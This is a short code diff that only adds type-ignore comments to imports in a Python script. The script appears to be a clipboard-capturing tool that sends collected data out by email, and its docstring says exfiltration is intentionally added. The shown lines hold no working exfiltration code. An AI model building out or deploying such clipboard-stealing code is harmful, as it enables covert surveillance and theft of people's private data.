@@ -10,7 +10,7 @@ Note: Outbound email or network exfiltration is intentionally added and document
 Do not use this project to violate privacy or laws. 
 """
 
-import win32clipboard
+import win32clipboard # type: ignore
 import smtplib
 import time
 from email.mime.text import MIMEText
@@ -18,7 +18,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 import os.path
-import win32con
+import win32con # type: ignore
 
 def get_clipboard():
   win32clipboard.OpenClipboard()
